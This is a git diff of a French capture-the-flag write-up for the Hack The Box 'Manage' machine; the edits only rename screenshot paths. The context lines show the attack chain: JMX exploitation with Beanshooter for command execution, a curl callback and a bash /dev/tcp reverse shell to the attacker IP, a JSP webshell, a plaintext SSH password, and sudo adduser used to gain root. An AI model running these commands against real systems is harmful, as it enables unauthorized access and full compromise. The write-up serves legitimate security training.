@@ -34,7 +34,7 @@ Commençons par un scan Nmap complet pour identifier les services exposés :
 nmap -sC -sV -p- -T4 10.129.236.246
 ```
 
-![Résultats du scan Nmap](/images/manage/nmap_scan.png)
+![Résultats du scan Nmap](/images/HTBManage/nmap_scan.png)
 
 {{< admonition tip "Ports Découverts" >}}
 - **22/tcp** : OpenSSH 8.9p1 Ubuntu (clé publique uniquement)
@@ -62,7 +62,7 @@ Utilisons Remote Method Guesser (RMG) pour énumérer le service RMI :
 java -jar rmg-4.4.1-jar-with-dependencies.jar enum 10.129.236.246 2222
 ```
 
-![Résultats de l'énumération RMG](/images/manage/rmg_enum.png)
+![Résultats de l'énumération RMG](/images/HTBManage/rmg_enum.png)
 
 {{< admonition note "Résultats Clés" >}}
 - Service JMX exposé : `jmxrmi` pointant vers `127.0.1.1:37549`
@@ -79,7 +79,7 @@ Poursuivons l'énumération avec Beanshooter, un outil spécialisé pour l'explo
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.236.246 2222
 ```
 
-![Résultats de l'énumération Beanshooter](/images/manage/beanshooter_enum.png)
+![Résultats de l'énumération Beanshooter](/images/HTBManage/beanshooter_enum.png)
 
 {{< admonition success "Vulnérabilités Critiques Détectées" >}}
 1. **JMX sans authentification**
@@ -126,7 +126,7 @@ Puisque l'accès direct à Tomcat est restreint, exploitons la vulnérabilité J
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.236.246 2222 exec "whoami"
 ```
 
-![Test d'exécution de commande](/images/manage/standard_mbean_rce.png)
+![Test d'exécution de commande](/images/HTBManage/standard_mbean_rce.png)
 
 {{< admonition tip "Mécanisme Technique" >}}
 - Beanshooter déploie un `TemplateImpl` payload via `StandardMBean`
@@ -146,7 +146,7 @@ python3 -m http.server 8000
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.236.246 2222 exec "curl http://10.10.14.54:8000/test"
 ```
 
-![Test de connectivité HTTP](/images/manage/http_connectivity.png)
+![Test de connectivité HTTP](/images/HTBManage/http_connectivity.png)
 
 {{< admonition success "Connexion Réussie" >}}
 La cible peut nous joindre via HTTP, ce qui nous ouvre une voie pour déployer un webshell
@@ -184,7 +184,7 @@ Accédons au webshell :
 http://10.129.236.246:8080/shell.jsp?cmd=id
 ```
 
-![Webshell fonctionnel](/images/manage/webshell_access.png)
+![Webshell fonctionnel](/images/HTBManage/webshell_access.png)
 
 {{< admonition success "Initial Access Obtenu" >}}
 Nous avons maintenant un accès initial à la machine via notre webshell JSP !
@@ -200,7 +200,7 @@ Via notre webshell, on effectue un revershell afin d'avoir un shell plus stable 
 http://10.129.236.246:8080/shell.jsp?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.54%2F4444%200%3E%261
 ```
 
-![Secret TOTP découvert](/images/manage/totp_secret.png)
+![Secret TOTP découvert](/images/HTBManage/totp_secret.png)
 
 {{< admonition note "Contenu Récupéré" >}}
 ```
@@ -232,7 +232,7 @@ python3 code.py
 # Output: 768204 (change toutes les 30 secondes)
 ```
 
-![Génération du code TOTP](/images/manage/totp_generation.png)
+![Génération du code TOTP](/images/HTBManage/totp_generation.png)
 
 ### **3. Connexion SSH avec 2FA**
 
@@ -244,7 +244,7 @@ Password: onyRPCkaG4iX72BrRtKgbszd
 Verification code: [CODE_GÉNÉRÉ]
 ```
 
-![Connexion SSH réussie](/images/manage/ssh_2fa_login.png)
+![Connexion SSH réussie](/images/HTBManage/ssh_2fa_login.png)
 
 {{< admonition success "Accès SSH Obtenu" >}}
 Nous avons maintenant un accès SSH complet en tant qu'utilisateur `useradmin` !
@@ -260,7 +260,7 @@ On commence par vérifier les privilèges de l'user :
 sudo -l
 ```
 
-![Configuration sudo](/images/manage/sudo_config.png)
+![Configuration sudo](/images/HTBManage/sudo_config.png)
 
 {{< admonition tip "Configuration Identifiée" >}}
 ```
@@ -281,7 +281,7 @@ sudo /usr/sbin/adduser admin
 # Définir un mot de passe lors de la création
 ```
 
-![Création de l'utilisateur admin](/images/manage/adduser_admin.png)
+![Création de l'utilisateur admin](/images/HTBManage/adduser_admin.png)
 
 {{< admonition note "Comportement Observé" >}}
 L'utilisateur `admin` est automatiquement ajouté au groupe admin avec privilèges sudo complets (dépend de la version du système).
@@ -299,7 +299,7 @@ sudo su
 # Entrer le mot de passe admin
 ```
 
-![Accès root obtenu](/images/manage/root_access.png)
+![Accès root obtenu](/images/HTBManage/root_access.png)
 
 {{< admonition success "Root Access Obtenu" >}}
 Nous avons maintenant un accès complet en tant que root !
